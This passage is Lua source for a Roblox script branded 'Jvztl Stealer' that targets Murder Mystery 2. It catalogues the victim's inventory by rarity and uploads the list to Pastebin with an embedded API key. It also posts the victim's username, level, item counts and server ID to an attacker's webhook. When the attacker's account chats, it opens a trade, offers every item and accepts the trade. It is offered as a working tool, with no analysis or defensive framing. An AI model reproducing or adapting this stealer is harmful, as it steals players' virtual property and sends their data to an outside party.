            table.insert(uniqueItems, formattedTable)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, formattedTable)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, formattedTable)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + 1
            table.insert(legendaryItems, formattedTable)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + 1
            table.insert(rareItems, formattedTable)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + 1
            table.insert(uncommonItems, formattedTable)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + 1
            table.insert(commonItems, formattedTable)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function pastebin(content)

    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2) 

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "\n ERROR: Country not supported \n"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

local uniquesString = ""
local ancientsString = ""
local godlysString = ""
local legendariesString = ""
local vintageString = ""
local raresString = ""
local uncommonString = ""
local commonsString = ""

for a,b in pairs(uniqueItems) do
    for c,d in pairs(b) do
        if c == "name" then
            uniquesString = uniquesString .. d .. ",\n"
        end
    end
end

for a,b in pairs(ancientItems) do
    for c,d in pairs(b) do
        if c == "name" then
            ancientsString = ancientsString .. d .. ",\n"
        end
    end
end

for a,b in pairs(godlyItems) do
    for c,d in pairs(b) do
        if c == "name" then
            godlysString = godlysString .. d .. ",\n"
        end
    end
end

for a,b in pairs(legendaryItems) do
    for c,d in pairs(b) do
        if c == "name" then
            legendariesString = legendariesString .. d .. ",\n"
        end
    end
end

for a,b in pairs(vintageItems) do
    for c,d in pairs(b) do
        if c == "name" then
            vintageString = vintageString .. d .. ",\n"
        end
    end
end

for a,b in pairs(rareItems) do
    for c,d in pairs(b) do
        if c == "name" then
            raresString = raresString .. d .. ",\n"
        end
    end
end

for a,b in pairs(uncommonItems) do
    for c,d in pairs(b) do
        if c == "name" then
            uncommonString = uncommonString .. d .. ",\n"
        end
    end
end

for a,b in pairs(commonItems) do
    for c,d in pairs(b) do
        if c == "name" then
            commonsString = commonsString .. d .. ",\n"
        end
    end
end

local EverythingString = "-- // Uniques\n" .. uniquesString ..
                         "\n\n-- // Ancient\n" .. ancientsString ..
                         "\n\n-- // Godlies\n" .. godlysString ..
                         "\n\n-- // Legendaries\n" .. legendariesString ..
                         "\n\n-- // Vintage\n" .. vintageString ..
                         "\n\n-- // Rare\n" .. raresString ..
                         "\n\n-- // Uncommon\n" .. uncommonString ..
                         "\n\n-- // Common\n" .. commonsString

local WebHookEmbed = CreateEmbed(
    "Jvztl Scripts | MM2",
    "Please execute the code above to get your hit.",
    11220,
    {
        {
            name = "```Info```", 
            value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl())..
                     "\nReceiver: "..userName.."```"
        },
        {
            name = "```Hit Info```", 
            value = "```Uniques: "..tostring(uniqueItemsC)..
                     "\nAncients: "..tostring(ancientItemsC)..
                     "\nGodlys: "..tostring(godlyItemsC)..
                     "\nLegendaries: "..tostring(legendaryItemsC)..
                     "\nVintage: "..tostring(vintageItemsC)..
                     "\nRares: "..tostring(rareItemsC)..
                     "\nUncommons: "..tostring(uncommonItemsC)..
                     "\nCommons: "..tostring(commonItemsC).."```"
        },
        {
            name = "```Summary```", 
            value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."```"
        },
        {
            name = "```Jvztl Stealer```", 
            value = "https://discord.gg/qcsZfTRKJA"
        }
    }
)

if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
    SendWebhook(webHook, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
else
    SendWebhook(webHook, {content = "@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
end

local function stealitems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[userName]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for a,b in pairs(uniqueItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(ancientItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(godlyItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(vintageItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(legendaryItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(rareItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(uncommonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(commonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    wait(6)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == userName then
        player.Chatted:Connect(function(msg)
            stealitems()
        end)
    end
end)

-- You can now run your custom Lua code with the username and webhook variables.